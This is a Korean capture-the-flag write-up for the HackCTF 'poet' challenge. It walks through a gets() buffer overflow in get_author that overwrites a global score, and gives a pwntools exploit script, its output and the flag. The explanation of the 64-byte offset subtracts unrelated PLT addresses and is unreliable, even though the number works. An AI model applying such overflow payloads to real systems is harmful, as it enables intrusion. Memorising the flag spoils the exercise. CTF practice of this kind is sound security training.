@@ -1,0 +1,270 @@
+
+checksec 를 입력했을때
+
+CANARY : disabled
+FORTIFY : disabled
+NX : ENABLED
+PIE : disabled
+RELRO : Partial
+
+뜨므로 
+
+1. BOF 가능
+2. go overwrite 가능
+3. 쉘코드 사용 불가 
+
+
+
+이제 천천히 한번 풀어보자.
+
+IDA 를 이용해서 코드를 뜯어보자.
+
+
+###
+main.c
+
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts(s);
+  while ( 1 )
+  {
+    get_poem();
+    get_author();
+    rate_poem();
+    if ( dword_6024E0 == 1000000 )
+      break;
+    puts(asc_400D78);
+  }
+  reward();
+}
+
+#########
+
+메인코드를 보면 반복문이 있는데 반복문을 통과하고 reward()함수가 실행되는것으로보아 reward() 함수가
+정답을 실행시키는 함수인것같고. 일단 함수들의 코드 내용을보자.
+
+#########
+
+get_poem.c
+
+__int64 get_poem()
+{
+  __int64 result; // rax
+
+  printf("Enter :\n> ");
+  result = gets(poem);
+  dword_6024E0 = 0;
+  return result;
+}
+
+
+get_author.c
+
+__int64 get_author()
+{
+  printf(&byte_400C38);
+  return gets(&unk_6024A0);
+}
+
+
+rate_poem.c
+
+int rate_poem()
+{
+  char dest; // [rsp+0h] [rbp-410h]
+  char *s1; // [rsp+408h] [rbp-8h]
+
+  strcpy(&dest, poem);
+  for ( s1 = strtok(&dest, " \n"); s1; s1 = strtok(0LL, " \n") )
+  {
+    if ( !strcmp(s1, "ESPR")
+      || !strcmp(s1, "eat")
+      || !strcmp(s1, "sleep")
+      || !strcmp(s1, "pwn")
+      || !strcmp(s1, "repeat")
+      || !strcmp(s1, "CTF")
+      || !strcmp(s1, "capture")
+      || !strcmp(s1, "flag") )
+    {
+      dword_6024E0 += 100;
+    }
+  }
+  return printf(asc_400BC0, poem, (unsigned int)dword_6024E0);
+}
+
+
+reward.c
+
+void __noreturn reward()
+{
+  char s; // [rsp+0h] [rbp-90h]
+  FILE *stream; // [rsp+88h] [rbp-8h]
+
+  stream = fopen("./flag.txt", "r");
+  fgets(&s, 128, stream);
+  printf(format, &unk_6024A0, &s);
+  exit(0);
+}
+
+
+################
+
+코드를 보았을떄 역시 reward 함수가 정답 함수고. 이것을 출력해야 답을 얻을수 있을거같다.
+
+이제 코드를 파해쳐보면 특정 키 즉 ex)flag ,CTF 등 같은 문자열을 입력하면 +100점씩 얻는데
+
+이 점수가 1000000점이 되어야 반복문이 멈추고 플래그가 뜬다. 하지만 코드를 좀더보면 
+
+점수를 저장하는 함수가 한바퀴 돌떄마다 0점으로 초기화되기떄문에 해당 위치에 우리가 
+
+저장한 점수를 넣어서 더하는 형식으로 풀면될것같다. 일단 우리가 점수를 저장해야할 위치를
+
+찾아야 하기떄문에 지금부터 찾아보자.
+
+##################
+
+
+gdb -q poet 를 해서 파일을 파해쳤을떄 
+
+
+
+gdb-peda$ disas main
+Dump of assembler code for function main:
+   0x00000000004009cc <+0>:    push   rbp
+   0x00000000004009cd <+1>:    mov    rbp,rsp
+   0x00000000004009d0 <+4>:    sub    rsp,0x10
+   0x00000000004009d4 <+8>:    mov    DWORD PTR [rbp-0x4],edi
+   0x00000000004009d7 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
+   0x00000000004009db <+15>:    mov    rax,QWORD PTR [rip+0x20169e]        # 0x602080 <stdout@@GLIBC_2.2.5>
+   0x00000000004009e2 <+22>:    mov    ecx,0x0
+   0x00000000004009e7 <+27>:    mov    edx,0x2
+   0x00000000004009ec <+32>:    mov    esi,0x0
+   0x00000000004009f1 <+37>:    mov    rdi,rax
+   0x00000000004009f4 <+40>:    call   0x4006a0 <setvbuf@plt>
+   0x00000000004009f9 <+45>:    mov    edi,0x400c68
+   0x00000000004009fe <+50>:    call   0x400640 <puts@plt>
+   0x0000000000400a03 <+55>:    mov    eax,0x0
+   0x0000000000400a08 <+60>:    call   0x400978 <get_poem>
+   0x0000000000400a0d <+65>:    mov    eax,0x0
+   0x0000000000400a12 <+70>:    call   0x4009a7 <get_author>
+   0x0000000000400a17 <+75>:    mov    eax,0x0
+   0x0000000000400a1c <+80>:    call   0x400844 <rate_poem>
+   0x0000000000400a21 <+85>:    mov    eax,DWORD PTR [rip+0x201ab9]        # 0x6024e0 <poem+1088>
+   0x0000000000400a27 <+91>:    cmp    eax,0xf4240
+   0x0000000000400a2c <+96>:    jne    0x400a3a <main+110>
+   0x0000000000400a2e <+98>:    mov    eax,0x0
+   0x0000000000400a33 <+103>:    call   0x4007e6 <reward>
+   0x0000000000400a38 <+108>:    jmp    0x400a03 <main+55>
+   0x0000000000400a3a <+110>:    mov    edi,0x400d78
+   0x0000000000400a3f <+115>:    call   0x400640 <puts@plt>
+   0x0000000000400a44 <+120>:    jmp    0x400a03 <main+55>
+End of assembler dump.
+gdb-peda$ p get_author
+$1 = {<text variable, no debug info>} 0x4009a7 <get_author>
+gdb-peda$ disas get_author
+Dump of assembler code for function get_author:
+   0x00000000004009a7 <+0>:    push   rbp
+   0x00000000004009a8 <+1>:    mov    rbp,rsp
+   0x00000000004009ab <+4>:    mov    edi,0x400c38
+   0x00000000004009b0 <+9>:    mov    eax,0x0
+   0x00000000004009b5 <+14>:    call   0x400650 <printf@plt>
+   0x00000000004009ba <+19>:    mov    edi,0x6024a0
+   0x00000000004009bf <+24>:    mov    eax,0x0
+   0x00000000004009c4 <+29>:    call   0x400690 <gets@plt>
+   0x00000000004009c9 <+34>:    nop
+   0x00000000004009ca <+35>:    pop    rbp
+   0x00000000004009cb <+36>:    ret   
+End of assembler dump.
+
+
+이므로
+
+0x0000000000400a1c <+80>:    call   0x400844 <rate_poem>
+   0x0000000000400a21 <+85>:    mov    eax,DWORD PTR [rip+0x201ab9]        # 0x6024e0 <poem+1088>
+
+call  로 rete_poem 에서 변수를 관리한다. 따라서 이후 출력하는 DWORD PTR [rip+0x201ab9] 에 입력되고
+출력된다.
+
+이것의 주소는 0x6024e0 
+
+또 우리가 방금 구한건 첫번쨰 입력칸이고 두번쨰 입력칸에 gets이 있으므로
+
+코드를 보면
+
+
+0x00000000004009b5 <+14>:    call   0x400650 <printf@plt>
+   0x00000000004009ba <+19>:    mov    edi,0x6024a0
+   0x00000000004009bf <+24>:    mov    eax,0x0
+   0x00000000004009c4 <+29>:    call   0x400690 <gets@plt>
+
+이다. 아마 위에 공격할만한 취약점이 없던것으로 보아 여기서의 gets을 이용하여 BOF 공격을 하면 될것같다.
+
+즉 여기 함수에서 포인트가 999900점 이라면 다음 rate_poem 함수에서 100점을 더한다면 클리어하게 된다.
+( 또는 그냥 1000000점을 집어넣어서 풀수도 있다. )
+즉 우리가 넣어야할 위치는 0x400690 - 0x400650	= 십진수로 64 이다.
+
+즉 get 함수 거리에서 get_author 초입 부분이다.
+즉 get_author에 우리가 따로 변수를 하나만들어주면 된다.
+
+이제 페이로드를 작성해보자.
+
+
+from pwn import *
+
+p = remote('ctf.j0n9hyun.xyz', 3012)
+
+score = 1000000
+
+payload1 = "aaaa"
+payload2 = 'a'*64
+payload2 += p64(score)
+
+p.recvuntil("> ")
+p.sendline(payload1)
+p.recvuntil("> ")
+p.sendline(payload2)
+
+p.interactive()
+
+해주면
+
+
+
++---------------------------------------------------------------------------+
+시 내용
+aaaa
+점수:1000000
+
+축하합니다!
+
+시 내용
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+2018년 시인 상을 받았습니다!!
+
+보상:
+HackCTF{0neSTEP_jun10rCTF}
+
++---------------------------------------------------------------------------+
+
+
+답이나온다.
+
+
+
+
+@@@@@@@@@@@
+
+
+
+정리
+
+
+>checksec를 입력해 빠르게 푸는 방법을 캐치하고
+>코드를 보고 코드가 어떻게 진행되는지 캐치후 해결방안 생각후
+>무슨 취약점에 공격해야할지 생각을하고
+>공격을할거면 어떻게해야할지 내가 넣어야할곳의 위치는 어디인지 생각하고
+>페이로드 작성
+
+
